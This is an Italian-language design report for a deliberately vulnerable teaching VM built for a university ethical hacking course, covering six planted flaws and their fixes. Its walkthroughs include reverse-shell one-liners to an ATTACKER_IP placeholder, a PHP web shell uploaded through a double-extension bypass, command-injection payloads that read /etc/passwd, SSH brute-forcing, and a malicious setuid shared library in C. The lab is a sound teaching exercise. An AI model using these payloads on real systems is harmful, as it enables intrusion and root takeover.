# Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration

## Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato

**Contexto del Progetto:**
- **Ateneo:** Sapienza Università di Roma, Dipartimento di Cybersecurity
- **Corso:** Ethical Hacking & Penetration Testing (A.A. 2023/24)
- **Ruolo:** Lead Architect & Full-Stack Developer (6 vulnerabilità, 3 livelli di difficoltà)
- **Target:** Progettazione di una macchina virtuale vulnerabile destinata a simulazioni didattiche in ambiente d'esame
- **Deliverable:** VM Linux funzionante + Report tecnico ufficiale + Codice sorgente

**Perché questo progetto è rilevante per la cybersecurity:**
Gli studenti non dovevano solo trovare vulnerabilità: dovevano capire come combinarle, seguendo il path footprint → access → privilege escalation.

**Tecnologie & Stack:**
- **Sistema Operativo:** Ubuntu 20.04.6 LTS
- **Web Stack:** Apache2 + PHP
- **Backend Logic:** Bash scripting, C (compilazione di exploit)
- **Vulnerabilità Implementate:** 6 distinte (3 Access Vectors, 3 Privilege Escalation), livelli Easy/Medium/Hard
- **Infrastructure:** Git versioning per tracking di design decisions

---

## 1. Concept & Architettura del Sistema

### 1.1 Come l'Abbiamo Pensata

Abbiamo deciso di non fare il solito "Linux VM con 6 flag nascosti" banale. Volevamo qualcosa che:

1. **Fosse realistica** – Una web gallery è qualcosa che studenti hanno veramente visto online, non un ambiente astratto
2. **Avesse una trama** – Il tema anime non è casuale: il prof ama gli anime, quindi è venuto naturale. Ma importante: gli hint sono nella UI (tooltip sulle immagini), quindi per trovarli serve fare OSINT sul sito, non leggere il codice
3. **Fosse progressivo** – Easy vulnerabilità per capire il flusso, Medium per imparare il bypass che funziona, Hard per chi ha capito bene

**La Scelta: Waifu Gallery**
Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (quegli anni c'erano), è un web service che effettivamente è stata una cosa, e gli studenti sapevano già di cosa parlavamo. Non ti devi spiegare "cosa è una gallery", sai già che è un sito dove scrolli immagini.

### 1.2 Architettura: Dove Abbiamo Messo Cosa

Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'attaccante doveva muoversi in ordine:

| Componente | Cosa È | Dove Attaccare |
|---|---|---|
| **Frontend** | Galleria PHP con barra ricerca | Web Command Injection (search bar) |
| **Upload nascosto** | imposter.php (non linkato) | File Upload bypass doppia estensione |
| **Backend Filters** | Blacklist comandi +regex | Bypassabile con `;;` e `##` |
| **System User** | `amogus` con password `sus1` | SSH brute-force (nome scopribile da hint UI) |
| **hping3 SUID** | Binary con bit SUID attivo | Root shell istantanea |
| **Cronjob** | Script scrivibile, eseguito come root | PATH hijacking |
| **ld.so config** | Libreria in path scrivibile | Library hijacking + assembly custom |

**Progressione pensata:**
- **Easy:** Scopri l'utente dalla UI => brute-force SSH => trovi SUID hping3
- **Medium:** Bypassa il filtro di ricerca web => scopri il cronjob, modifichi e aspetti per la root rev. shell
- **Hard:** Trovi imposter.php e busti il filtro upload => crei la libreria in C malevola, la sostituisci, hijacki ld.so

---

## 2. Vulnerability Landscape & Exploitation Chains

### 2.1 Vulnerability Summary Matrix

| #  | Nome Vulnerabilità | Categoria | Difficoltà | Prerequisiti | Post-Exploitation |
|----|----|---|---|---|---|
| **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | Nessuno (brute-force pubblico) | Shell utente `amogus` |
| **3.2** | Web Command Injection | Lateral Escalation | ⭐⭐ MEDIUM | Accesso a web app (default) | RCE come www-data user |
| **3.3** | File Upload + Shell Execution | RCE | ⭐⭐⭐ HARD | Riconoscimento pagina nascosta + upload bypass + esecuzione | Shell www-data + persistent backdoor |
| **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Shell utente non-root | Shell root immediata |
| **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | Accesso utente + attesa timing | Shell root (da reverse shell) |
| **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Shell root |

### 2.2 Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────┐
│ INITIAL ACCESS                                          │
│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest  │
│ └─ [3.1] HTTP Reconnaissance → UI hints               │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ LATERAL MOVEMENT / WEB RCE                              │
│ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
│ │         shell_exec() bypass                          │
│ └─ [3.3] Hidden upload page (imposter.php)            │
│          shell.php.jpg double extension bypass         │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ PRIVILEGE ESCALATION (Choose One)                       │
│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest   │
│ ├─ [4.2] Cronjob PATH manipulation                     │
│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex    │
└─────────────────────────────────────────────────────────┘
```

**Chiave Didattica:**
Ogni livello dimostra concetti reali riscontrati in engagement professionali:
- **Easy:** Reconnaissance basica + weak credentials (es. Spring4Shell, ProxyLogon preliminary phases)
- **Medium:** Sanitizzazione insufficiente + misunderstanding di shell metacharacters
- **Hard:** Understanding profondo di ELF loader + exploitation of complex privilege boundaries

---

## 3. Vulnerabilità di Accesso (Implementazione Personale)

In questa sezione vengono descritti i vettori di ingresso progettati e implementati per consentire all'attaccante di ottenere il primo accesso al sistema.

### 3.1 Weak SSH Credentials – Easy Mode

#### Setup
L'utente `amogus` con password `sus1` è il primo indizio. Il nome è un riferimento ad Among Us (il gioco), che all'epoca era famoso nei nostri gruppi di studio. Sapevamo che gli altri studenti lo avrebbero riconosciuto.

La password non è nella UI da nessuna parte, ma il nome sì: se apri il DevTools e ispezioni una qualunque immagine della gallery, vedi:
```html
<img src="..." title="amogus" ...>
```

Quindi per risolvere questa vulnerabilità serve:
1. Osservare la UI (aprire inspector del browser)
2. Identificare il titolo nascosto
3. Tentare brute-force su SSH con quel nome

#### L'Exploit
```bash
# Reconnaissance: passa il mouse su un'immagine, vedi il tooltip
# Oppure F12 → Inspector, cerca title attribute

# Brute-force SSH
hydra -l amogus -P wordlist.txt ssh://<vm_ip>
# Oppure: ssh amogus@<vm_ip> con password "sus1"
```

È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico sforzo è capire che vai su SSH, non sul web app.

### 3.2 Web Command Injection – Medium Mode

#### La Vulnerabilità
La search bar fa ricerca di immagini con `shell_exec("ls $image_folder$query*.jpg")`.Il filtro era blacklist-based: blocca bash, nc, wget, comandi specifici. Però abbiamo volutamente lasciato un buco.

Se usi `;` o `#` direttamente, viene bloccato. MA se usi `;;` e `##`, il filtro le riconosce come "doppi" e le permette. Poi c'è un `str_replace()` che li converte in singoli:
```php
if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
    $query = str_replace(";;", ";", $query);    // ;; -> ;
    $query = str_replace("##", "#", $query);    // ## -> #
}
```

Il problema: il controllo PRIMA della sostituzione. Quindi `;;ls /##` passa il filtro perché `;;` non è `;`, non viene bloccato.

#### Come Risolverla
```bash
# Payload diretti
;;ls /##            # Elenca root directory
;;cat /etc/passwd##  # Legge file sensibili
;;whoami##          # Vedi chi sei

# Payload più complessi (reverse shell):
;;bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1##
```

**Difesa:**
Non usare `shell_exec` con input user. O se lo fai:
1. **Whitelist** – accetta solo caratteri sicuri: `preg_replace('/[^a-zA-Z0-9_-]/', '', $query)`
2. **escapeshellarg()** – se proprio devi usare shell_exec: `escapeshellarg($query)`
3. **Meglio: PHP native** – `glob("images/{$query}*.jpg")` senza shell

### 3.3 File Upload Bypass – Hard Mode

#### L'Idea
Abbiamo creato una pagina nascosta `imposter.php` che non è linkata da nessuna parte. Se la trovi e accedi, puoi uploadare un file.

Il filtro controlla solo l'estensione finale via `pathinfo()`. Quindi:
- `shell.php.jpg` → estensione = `.jpg` ✅ passa il filtro
- Ma il file si salva come `shell.php.jpg` e se Apache lo esegue come PHP → RCE

#### Come la Trovi
```bash
# 1. Brute force
gobuster dir -u http://<vm_ip> -w /usr/share/wordlists/common.txt
# Scopri imposter.php

# 2. O se hai RCE dalla command injection:
cat index.php | grep -i "upload\|form\|POST"  # Find links to imposter.php
```

#### L'Exploit
```bash
# Crea una web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Rinomina con doppia estensione
mv shell.php shell.php.jpg

# Upload
curl -F "image=@shell.php.jpg" http://<vm_ip>/imposter.php

# Esegui
curl "http://<vm_ip>/images/shell.php.jpg?cmd=id"
# uid=33(www-data) ...
```

#### Difesa
1. **Controlla magic bytes** – Non extension. `getimagesize()` verifica se è davvero un'immagine
2. **Rinomina il file** - Genera nome random: `bin2hex(random_bytes(16)) . ".jpg"`
3. **Store outside webroot** - Salva in `/var/uploads/`, non dove Apache può eseguire
4. **Disabilita PHP execution** nella cartella upload (.htaccess o web.config)

## 4. Privilege Escalation – Come Diventare Root

### 4.1 SUID hping3 – Easy

#### Cos'è hping3?
`hping3` è un packet crafting tool, simile a `ping` ma con stereoidi. Si usa per testare firewall, creare pacchetti custom, roba così. NON dovrebbe mai avere SUID.

#### L'Exploit
```bash
# Enumerare SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep hping
# Output: /usr/sbin/hping3

# Eseguire hping3 (che è SUID root)
$ /usr/sbin/hping3
hping3 > /bin/sh -p

# Boom, sei root
$ whoami
root
```

La flag `-p` di `/bin/sh` è critica: "preserve mode". Senza, la shell droppa i privilegi automaticamente.

#### Perché funziona
`hping3` con SUID esegue come root. Dentro hping3 c'è una funzionalità di shell escape. Chiedi una shell, e il processo (che è root) te la dà. Easy.

#### Difesa
```bash
# Remove SUID
chmod -s /usr/sbin/hping3

# Oppure usare sudo con logging:
# sudoers: amogus ALL=(root) NOPASSWD: /usr/sbin/hping3
```

### 4.2 Cronjob PATH Hijacking – Medium

#### Come Funziona
Cronjob (cron) è un Linux scheduler che esegue scripts periodicamente. Se:
- Lo script viene eseguito **come root** ma è **scrivibile da non-root**
- E usa **path relativo** per eseguire comandi

Allora dirottiamo gli eseguibili aggiungendo una directory fake al PATH dove creiamo eseguibili nostri con lo stesso nome. Quando cron esegue il comando, trova il nostro fake.

#### Vulnerability Discovery Phase

**Step 1: Identify the "overwrite.sh" script**
```bash
find / -name "overwrite.sh" -type f -writable 2>/dev/null
# Output: /home/developer/overwrite.sh
# Permissions: -rw-rw-r-- (writable by non-root!)
```

**Step 2: Examine the script content**
```bash
cat /home/developer/overwrite.sh
# Output uses RELATIVE paths:
# ls /          (instead of: /bin/ls /)
# whoami        (instead of: /usr/bin/whoami)
# id            (instead of: /usr/bin/id)
```

#### The Vulnerability: Relative vs Absolute Paths

**How PATH hijacking works:**
When cron executes the script with PATH like `/home/developer:/usr/bin:/bin`:
```
When script executes: ls
System searches:
1. /home/developer/ls        ← Attacker CREATES THIS
2. /usr/bin/ls
3. /bin/ls

Result: Attacker's malicious /home/developer/ls executes as root!
```

#### Exploitation Chain

**Step 1: Create malicious executable**
```bash
cat > /home/developer/ls << 'EOF'
#!/bin/bash
# This will execute as ROOT because cron runs as root!
bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1
EOF
chmod +x /home/developer/ls
```

**Step 2: Set up listener**
```bash
nc -lnvp 7777
# Waiting for reverse shell...
```

**Step 3: Wait for cron execution**
```bash
# Cron will execute overwrite.sh at scheduled time (e.g., every minute)
# When it runs "ls /" inside the script:
# It looks for "ls" in PATH
# Finds /home/developer/ls
# Executes OUR malicious script as root
```

**Step 4: Get root shell**
```bash
root@vm:/# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Remediation (Multi-Layered)

**Layer 1: Use absolute paths in scripts (PRIMARY)**
```bash
#!/bin/bash
# SECURE: All paths are absolute
/bin/ls /
/usr/bin/whoami
/usr/bin/id
/bin/cat /etc/passwd
```

**Layer 2: Set restrictive PATH in cronjob**
```cron
# In /etc/cron.d/example:
PATH=/bin:/usr/bin
SHELL=/bin/bash
* * * * * root /home/developer/overwrite.sh > /dev/null 2>&1
```

**Layer 3: Make scripts non-writable by non-root**
```bash
chmod 750 /home/developer/overwrite.sh
# Now only owner (root) and group can modify
``` 

### 4.3 LD.SO Hijacking – Hard

#### Come Funziona L'ELF Loader
L'ELF loader (`ld.so`) risolve le librerie dinamiche che un programma ha bisogno al runtime. Segue un ordine di ricerca specifico:

```
1. LD_LIBRARY_PATH (variabile ambiente)
2. /etc/ld.so.cache (cache compilata)
3. /etc/ld.so.conf e /etc/ld.so.conf.d/ (config di sistema)
4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
```

Se un binary SUID cerca una libreria in una directory **scrivibile**, possiamo mettere lì la nostra versione malware e il binary SUID la carica.

#### Discovery: Finding the Vulnerable Binary

**Step 1: Check for non-standard library paths**
```bash
# Check /etc/ld.so.conf.d/ for unusual paths:
ls -la /etc/ld.so.conf.d/
cat /etc/ld.so.conf.d/* | grep -v "^#"
# Output might include: /home/developer/libs

# Verify if path is writable by non-root:
ls -la /home/developer/libs
# Output: drwxrwxr-x 1 root www-data (www-data can write here!)
```

**Step 2: Find SUID binary with missing library**
```bash
find / -perm -4000 -type f 2>/dev/null

# For each binary, check what libraries it needs:
ldd /usr/sbin/testingapp
# Output example:
#   libcustomapp.so => not found              ← MISSING LIBRARY!
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

#### The Exploit: Creating Malicious Library

**Step 1: Create malicious libcustomapp.so**
```c
// malicious_libcustomapp.c
#include <unistd.h>
void functionLoader() {
    setuid(0);      // Set UID to root
    setgid(0);      // Set GID to root
    system("/bin/sh");  // Spawn shell as root
}
```

**Step 2: Compile the malicious library**
```bash
gcc -shared -fPIC -o libcustomapp.so malicious_libcustomapp.c

# Verify it was created:
file libcustomapp.so
```

**Step 3: Place library in the vulnerable directory**
```bash
cp libcustomapp.so /home/developer/libs/

# Verify placement:
ls -la /home/developer/libs/libcustomapp.so
```

**Step 4: Execute the vulnerable binary**
```bash
/usr/sbin/testingapp

# What happens:
# 1. testingapp starts (SUID means it runs as root)
# 2. ELF loader searches for libcustomapp.so
# 3. Finds our malicious /home/developer/libs/libcustomapp.so FIRST
# 4. Loads OUR library which calls setuid(0) + system("/bin/sh")
# 5. Shell prompt appears as root!

# Result:
# # whoami
# root
```

#### Remediation (Hardening)

**Layer 1: Use absolute paths + remove unsafe entries**
```bash
# Remove or comment out:
cat /etc/ld.so.conf.d/custom.conf
# /home/developer/libs   ← REMOVE THIS

# Rebuild the loader cache:
sudo ldconfig
```

**Layer 2: Remove SUID bit**
```bash
chmod -s /usr/sbin/testingapp
```

**Layer 3: Make library directories read-only**
```bash
chmod 555 /home/developer/libs
```

**Layer 4: Force RPATH (static library path)**
```bash
# When compiling, use -Wl,-rpath:
gcc -o testingapp testingapp.c -lcustomapp -Wl,-rpath=/usr/local/lib/secure
# Binary looks ONLY in /usr/local/lib/secure
# Ignores LD_LIBRARY_PATH and /etc/ld.so.conf.d/
```

## 5. Come Ripararlo – Strategie di Defense

### 5.1 Priorità di Fix

| Vulnerabilità | Severity | Remediation Primary | Tempo Impl. | Effort | Collaudo |
|---|---|---|---|---|---|
| 3.1 (Weak SSH) | CRITICAL | SSH key-based + strong policy | 2 hrs | LOW | `ssh-keygen -t ed25519` |
| 3.2 (Cmd Inject) | CRITICAL | Sanitize input + use whitelist | 4 hrs | MEDIUM | `escapeshellarg()` test |
| 3.3 (Upload RCE) | CRITICAL | Magic bytes + disable PHP in upload dir | 3 hrs | MEDIUM | File upload test |
| 4.1 (SUID hping3) | HIGH | Remove SUID bit | 15 min | LOW | `find / -perm -4000` |
| 4.2 (Cronjob) | HIGH | Absolute paths + restrictive PATH | 1 hr | MEDIUM | Monitor cron execution |
| 4.3 (ld.so) | HIGH | Remove unsafe ld.so.conf.d entries | 30 min | LOW | Verify ld.so.conf.d |

### 5.2 La Strategia Di Difesa

**Da Fare Subito (Riparare le Vulnerabilità Web):**
1. Non usare funzioni pericolose come `shell_exec()` senza sanitizing
2. Se proprio necessario, whitelist solo i caratteri sicuri (lettere, numeri, wildcard `*`)
3. Upload files: controlla magic bytes, non solo estensione
4. Disabilita PHP in `/images/` con `.htaccess` (Apache) o nginx config

**Dopo (Elimina i Privilege Escalation):**
5. Togli SUID da binari non necessari
6. SSH: usa solo key-based auth, password disabled
7. Cronjob: sempre path assoluto, mai relativo
8. LD.SO: audita `/etc/ld.so.conf.d/`, rimuovi path user-writable
9. Controllo mensile di SUID binary con `find / -perm -4000`

**Ongoing (Monitoraggio):**
10. Scan di web input periodicamente
11. Audit file permission (monthly)
12. Log analysis per accessi non autorizzati
